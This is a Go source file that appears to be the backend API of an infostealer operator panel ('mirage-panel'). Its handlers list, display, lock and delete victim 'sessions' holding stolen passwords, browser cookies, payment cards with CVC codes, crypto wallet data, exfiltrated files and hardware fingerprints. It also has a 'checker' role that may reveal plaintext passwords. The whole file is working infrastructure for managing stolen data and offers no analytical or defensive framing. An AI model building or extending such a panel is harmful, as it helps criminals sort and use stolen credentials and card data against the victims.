package api

import (
	"database/sql"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/user/mirage-panel/internal/auth"
	"github.com/user/mirage-panel/internal/db"
	"github.com/user/mirage-panel/internal/middleware"
)

var allowedSorts = map[string]string{
	"created_at": "s.created_at",
	"os":         "s.os",
	"ip":         "s.ip",
	"country":    "s.country_code",
}

var walletIcons = map[string]string{
	"MetaMask": "🦊",
	"Phantom":  "👻",
	"Trust":    "🔒",
	"Coinbase": "🔷",
	"Exodus":   "📀",
	"Electrum": "⚡",
	"Ledger":   "📒",
	"Trezor":   "🛡️",
}

type SessionsHandler struct {
	db *sql.DB
}

func NewSessionsHandler(db *sql.DB) *SessionsHandler {
	return &SessionsHandler{db: db}
}

type SessionListItem struct {
	ID             string `json:"id"`
	BuildID        string `json:"build_id,omitempty"`
	Hwid           string `json:"hwid,omitempty"`
	Os             string `json:"os,omitempty"`
	Username       string `json:"username,omitempty"`
	Ip             string `json:"ip,omitempty"`
	CountryCode    string `json:"country_code,omitempty"`
	CreatedAt      string `json:"created_at"`
	PasswordsCount int    `json:"passwords_count"`
	CookiesCount   int    `json:"cookies_count"`
	CardsCount     int    `json:"cards_count"`
	WalletsCount   int    `json:"wallets_count"`
	FilesCount     int    `json:"files_count"`
	Viewed         int    `json:"viewed"`
	DuplicateCount int    `json:"duplicate_count,omitempty"`
}

type SessionDetailResponse struct {
	ID          string              `json:"id"`
	BuildID     string              `json:"build_id,omitempty"`
	Hwid        string              `json:"hwid,omitempty"`
	Os          string              `json:"os,omitempty"`
	Username    string              `json:"username,omitempty"`
	Ip          string              `json:"ip,omitempty"`
	CountryCode string              `json:"country_code,omitempty"`
	CreatedAt   string              `json:"created_at"`
	Passwords   []db.Password       `json:"passwords"`
	Cookies     []db.Cookie         `json:"cookies"`
	Cards       []db.Card           `json:"cards"`
	Wallets     []db.WalletResponse `json:"wallets"`
	Files       []db.StolenFile     `json:"files"`
	SystemInfo  *db.SystemInfo      `json:"system_info"`
	Viewed      int                 `json:"viewed"`
}

func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
	page, _ := strconv.Atoi(r.URL.Query().Get("page"))
	if page < 1 {
		page = 1
	}

	limit, _ := strconv.Atoi(r.URL.Query().Get("limit"))
	if limit < 1 || limit > 100 {
		limit = 50
	}

	sort := r.URL.Query().Get("sort")
	if sort == "" {
		sort = "-created_at"
	}

	unviewedOnly := r.URL.Query().Get("unviewed_only") == "true"

	var conditions []string
	var args []any

	if country := r.URL.Query().Get("country"); country != "" {
		conditions = append(conditions, "s.country_code = ?")
		args = append(args, country)
	}
	if os := r.URL.Query().Get("os"); os != "" {
		conditions = append(conditions, "s.os = ?")
		args = append(args, os)
	}
	if hwid := r.URL.Query().Get("hwid"); hwid != "" {
		conditions = append(conditions, "s.hwid = ?")
		args = append(args, hwid)
	}
	if q := r.URL.Query().Get("q"); q != "" {
		like := "%" + q + "%"
		conditions = append(conditions, "(s.ip LIKE ? OR s.os LIKE ? OR s.username LIKE ? OR s.hwid LIKE ?)")
		args = append(args, like, like, like, like)
	}
	if unviewedOnly {
		conditions = append(conditions, "(s.viewed IS NULL OR s.viewed = 0)")
	}

	where := ""
	if len(conditions) > 0 {
		where = "WHERE " + strings.Join(conditions, " AND ")
	}

	countQuery := "SELECT COUNT(*) FROM sessions s " + where
	var total int
	if err := h.db.QueryRow(countQuery, args...).Scan(&total); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to count sessions")
		return
	}

	var orderClause string
	if len(sort) > 0 {
		dir := "ASC"
		field := sort
		if sort[0] == '-' {
			dir = "DESC"
			field = sort[1:]
		} else if sort[0] == '+' || sort[0] == ' ' {
			field = sort[1:]
		}
		if col, ok := allowedSorts[field]; ok {
			orderClause = fmt.Sprintf("ORDER BY %s %s", col, dir)
		} else {
			writeError(w, http.StatusBadRequest, "invalid sort field")
			return
		}
	}

	offset := (page - 1) * limit

	query := fmt.Sprintf(`
		SELECT s.id, s.build_id, s.hwid, s.os, s.username, s.ip,
		       s.country_code, s.created_at, COALESCE(s.viewed, 0),
		       (SELECT COUNT(*) FROM passwords p WHERE p.session_id = s.id),
		       (SELECT COUNT(*) FROM cookies c WHERE c.session_id = s.id),
		       (SELECT COUNT(*) FROM cards c WHERE c.session_id = s.id),
		       (SELECT COUNT(*) FROM wallets w WHERE w.session_id = s.id),
		       (SELECT COUNT(*) FROM stolen_files f WHERE f.session_id = s.id)
		FROM sessions s %s %s LIMIT ? OFFSET ?`, where, orderClause)

	queryArgs := make([]any, len(args)+2)
	copy(queryArgs, args)
	queryArgs[len(args)] = limit
	queryArgs[len(args)+1] = offset

	rows, err := h.db.Query(query, queryArgs...)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query sessions")
		return
	}
	defer rows.Close()

	items := make([]SessionListItem, 0)
	for rows.Next() {
		var item SessionListItem
		if err := rows.Scan(
			&item.ID, &item.BuildID, &item.Hwid, &item.Os, &item.Username,
			&item.Ip, &item.CountryCode, &item.CreatedAt, &item.Viewed,
			&item.PasswordsCount, &item.CookiesCount, &item.CardsCount,
			&item.WalletsCount, &item.FilesCount,
		); err != nil {
			writeError(w, http.StatusInternalServerError, "failed to scan session row")
			return
		}
		if item.Hwid != "" {
			// ponytail: N+1 query per row — batch this into a single hash map
			// query when HWID-based grouping becomes a measurable bottleneck.
			var dupCount int
			h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE hwid = ? AND id != ?", item.Hwid, item.ID).Scan(&dupCount)
			item.DuplicateCount = dupCount
		}
		items = append(items, item)
	}
	if err := rows.Err(); err != nil {
		writeError(w, http.StatusInternalServerError, "failed to iterate session rows")
		return
	}

	pages := (total + limit - 1) / limit

	writeJSON(w, http.StatusOK, map[string]any{
		"items": items,
		"total": total,
		"page":  page,
		"limit": limit,
		"pages": pages,
	})
}

func (h *SessionsHandler) Detail(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	var s struct {
		ID          string
		BuildID     string
		Hwid        string
		Os          string
		Username    string
		Ip          string
		CountryCode string
		CreatedAt   string
		Viewed      int
	}
	err := h.db.QueryRow(`
		SELECT id, build_id, hwid, os, username, ip, country_code, created_at, COALESCE(viewed, 0)
		FROM sessions WHERE id = ?`, id).Scan(
		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
		&s.Ip, &s.CountryCode, &s.CreatedAt, &s.Viewed,
	)
	if err == sql.ErrNoRows {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to fetch session")
		return
	}

	reveal := r.URL.Query().Get("reveal_passwords") == "true"
	if reveal {
		claims := middleware.ClaimsFromContext(r.Context())
		if claims == nil || (claims.Role != "admin" && claims.Role != "checker") {
			reveal = false
		}
	}

	passwords := queryPasswords(h.db, id)
	if !reveal {
		for i := range passwords {
			passwords[i].PasswordValue = "***HIDDEN***"
		}
	}
	cookies := queryCookies(h.db, id)
	cards := queryCards(h.db, id)
	wallets := queryWalletsWithIcons(h.db, id)
	files := queryFiles(h.db, id)
	sysInfo := querySystemInfo(h.db, id)

	// Check session lock — hide sensitive data if locked by another
	claims := middleware.ClaimsFromContext(r.Context())
	var lockedBy string
	locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
	if locked && claims != nil && lockedBy != claims.UserID && claims.Role != "admin" {
		passwords = []db.Password{}
		cookies = []db.Cookie{}
		cards = []db.Card{}
		wallets = []db.WalletResponse{}
	}

	resp := SessionDetailResponse{
		ID:          s.ID,
		BuildID:     s.BuildID,
		Hwid:        s.Hwid,
		Os:          s.Os,
		Username:    s.Username,
		Ip:          s.Ip,
		CountryCode: s.CountryCode,
		CreatedAt:   s.CreatedAt,
		Passwords:   passwords,
		Cookies:     cookies,
		Cards:       cards,
		Wallets:     wallets,
		Files:       files,
		SystemInfo:  sysInfo,
		Viewed:      s.Viewed,
	}

	writeJSON(w, http.StatusOK, resp)
}

func (h *SessionsHandler) Delete(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	result, err := h.db.Exec("DELETE FROM sessions WHERE id = ?", id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to delete session")
		return
	}

	rows, err := result.RowsAffected()
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to check deletion result")
		return
	}

	if rows == 0 {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}

	writeJSON(w, http.StatusOK, map[string]string{"message": "session deleted"})
}

func (h *SessionsHandler) MarkViewed(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	result, err := h.db.Exec("UPDATE sessions SET viewed = 1 WHERE id = ?", id)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to mark as viewed")
		return
	}
	rows, _ := result.RowsAffected()
	if rows == 0 {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}

	writeJSON(w, http.StatusOK, map[string]bool{"viewed": true})
}

func queryPasswords(d *sql.DB, sessionID string) []db.Password {
	rows, err := d.Query(
		"SELECT id, session_id, url, username, password_value, browser FROM passwords WHERE session_id = ?",
		sessionID)
	if err != nil {
		return []db.Password{}
	}
	defer rows.Close()

	var result []db.Password
	for rows.Next() {
		var p db.Password
		if rows.Scan(&p.ID, &p.SessionID, &p.Url, &p.Username, &p.PasswordValue, &p.Browser) == nil {
			result = append(result, p)
		}
	}
	return result
}

func queryCookies(d *sql.DB, sessionID string) []db.Cookie {
	rows, err := d.Query(
		"SELECT id, session_id, domain, name, value, path FROM cookies WHERE session_id = ?",
		sessionID)
	if err != nil {
		return []db.Cookie{}
	}
	defer rows.Close()

	var result []db.Cookie
	for rows.Next() {
		var c db.Cookie
		if rows.Scan(&c.ID, &c.SessionID, &c.Domain, &c.Name, &c.Value, &c.Path) == nil {
			result = append(result, c)
		}
	}
	return result
}

func queryCards(d *sql.DB, sessionID string) []db.Card {
	rows, err := d.Query(
		"SELECT id, session_id, number, exp_month, exp_year, holder, cvc FROM cards WHERE session_id = ?",
		sessionID)
	if err != nil {
		return []db.Card{}
	}
	defer rows.Close()

	var result []db.Card
	for rows.Next() {
		var c db.Card
		if rows.Scan(&c.ID, &c.SessionID, &c.Number, &c.ExpMonth, &c.ExpYear, &c.Holder, &c.Cvc) == nil {
			result = append(result, c)
		}
	}
	return result
}

func queryWalletsWithIcons(d *sql.DB, sessionID string) []db.WalletResponse {
	rows, err := d.Query(
		"SELECT id, session_id, name, path FROM wallets WHERE session_id = ?",
		sessionID)
	if err != nil {
		return []db.WalletResponse{}
	}
	defer rows.Close()

	var result []db.WalletResponse
	for rows.Next() {
		var w struct {
			ID, SessionID, Name, Path string
		}
		if rows.Scan(&w.ID, &w.SessionID, &w.Name, &w.Path) == nil {
			icon := walletIcons[w.Name]
			result = append(result, db.WalletResponse{
				ID:   w.ID,
				Name: w.Name,
				Icon: icon,
				Path: w.Path,
			})
		}
	}
	return result
}

func queryFiles(d *sql.DB, sessionID string) []db.StolenFile {
	rows, err := d.Query(
		"SELECT id, session_id, filename, size FROM stolen_files WHERE session_id = ?",
		sessionID)
	if err != nil {
		return []db.StolenFile{}
	}
	defer rows.Close()

	var result []db.StolenFile
	for rows.Next() {
		var f db.StolenFile
		if rows.Scan(&f.ID, &f.SessionID, &f.Filename, &f.Size) == nil {
			result = append(result, f)
		}
	}
	return result
}

func querySystemInfo(d *sql.DB, sessionID string) *db.SystemInfo {
	var info db.SystemInfo
	err := d.QueryRow(`
		SELECT session_id, cpu, gpu, ram, os, screen, hostname, local_ip,
		       mac, public_ip, hwid, uptime
		FROM system_info WHERE session_id = ?`, sessionID).Scan(
		&info.SessionID, &info.Cpu, &info.Gpu, &info.Ram, &info.Os,
		&info.Screen, &info.Hostname, &info.LocalIp, &info.Mac,
		&info.PublicIP, &info.Hwid, &info.Uptime,
	)
	if err != nil {
		return nil
	}
	return &info
}

type LockInfo struct {
	SessionID string `json:"session_id"`
	LockedBy  string `json:"locked_by"`
	LockedAt  string `json:"locked_at"`
}

func (h *SessionsHandler) Lock(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")

	claims, ok := r.Context().Value(claimsKey).(*auth.Claims)
	if !ok || claims == nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}

	var exists int
	err := h.db.QueryRow("SELECT COUNT(*) FROM sessions WHERE id = ?", sessionID).Scan(&exists)
	if err != nil || exists == 0 {
		writeError(w, http.StatusNotFound, "session not found")
		return
	}

	// Auto-unlock stale locks (>30 min)
	h.db.Exec("DELETE FROM session_locks WHERE session_id = ? AND locked_at < datetime('now', '-30 minutes')", sessionID)

	var currentLockedBy string
	err = h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&currentLockedBy)
	if err == nil {
		if currentLockedBy != claims.UserID {
			writeError(w, http.StatusConflict, "session is locked by another user")
			return
		}
		writeError(w, http.StatusConflict, "session is already locked by you")
		return
	}

	now := time.Now().UTC().Format("2006-01-02 15:04:05")
	_, err = h.db.Exec(
		"INSERT INTO session_locks (session_id, locked_by, locked_at) VALUES (?, ?, ?)",
		sessionID, claims.UserID, now,
	)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to lock session")
		return
	}

	writeJSON(w, http.StatusOK, LockInfo{
		SessionID: sessionID,
		LockedBy:  claims.UserID,
		LockedAt:  now,
	})
}

func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request) {
	sessionID := chi.URLParam(r, "id")

	claims, ok := r.Context().Value(claimsKey).(*auth.Claims)
	if !ok || claims == nil {
		writeError(w, http.StatusUnauthorized, "authentication required")
		return
	}

	var lockedBy string
	err := h.db.QueryRow(
		"SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID,
	).Scan(&lockedBy)
	if err == sql.ErrNoRows {
		writeError(w, http.StatusNotFound, "session is not locked")
		return
	}
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to query lock")
		return
	}

	if lockedBy != claims.UserID && claims.Role != "admin" {
		writeError(w, http.StatusForbidden, "session is locked by another user")
		return
	}

	_, err = h.db.Exec("DELETE FROM session_locks WHERE session_id = ?", sessionID)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "failed to unlock session")
		return
	}

	writeJSON(w, http.StatusOK, map[string]string{
		"message": "session unlocked",
	})
}
